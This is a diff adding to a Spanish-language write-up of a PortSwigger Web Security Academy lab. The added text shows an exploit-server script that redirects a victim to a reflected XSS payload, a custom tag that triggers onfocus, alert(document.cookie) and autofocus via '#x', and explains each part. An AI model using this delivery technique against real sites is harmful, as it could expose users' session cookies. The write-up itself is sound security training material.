@@ -84,3 +84,36 @@ Utilizamos una etiqueta personalizada `<xss>` con los siguientes atributos:
 Enviamos este payload y luego agregamos el `#x` al final:
 ![image](https://github.com/user-attachments/assets/41549c6d-8045-40c4-a03c-0c1ad29f5126)
 
+En este paso del laboratorio, usamos el **Exploit Server** para automatizar la ejecución del XSS sin requerir interacción del usuario.
+
+## 💥 Código insertado en el Exploit Server
+
+```html
+<script>
+location = 'https://0aae00bf040fe50b80e3302c004b0012.web-security-academy.net/?search=%3Cxss+id%3D%22x%22+onfocus%3D%22alert(document.cookie)%22+tabindex%3D%221%22%3E%3C%2Fxss%3E#x'
+</script>
+```
+![image](https://github.com/user-attachments/assets/075c3474-8621-4d53-98aa-bb98bccd2461)
+
+## 🧠 Conclusión
+
+- `<script>...</script>`: Este bloque se ejecuta automáticamente al cargar la página del exploit server.
+
+- `location = 'URL'`: Redirige al navegador de la víctima automáticamente a la URL vulnerable con el payload.
+
+### Contenido de la URL codificada:
+
+Inyecta una etiqueta personalizada `<xss>` con:
+
+- `id="x"` → identificador para el hash.
+- `onfocus="alert(document.cookie)"` → ejecuta la alerta al enfocar el elemento.
+- `tabindex="1"` → permite que el elemento sea enfocable automáticamente.
+- El `#x` al final de la URL hace que el navegador enfoque el elemento con ID `x`.
+
+
+
+Enviamos el exploit a la víctima y resolvemos el lab:
+![image](https://github.com/user-attachments/assets/2ca03a06-71d7-4fea-b7ad-e145da0b2c2d)
+
+
+
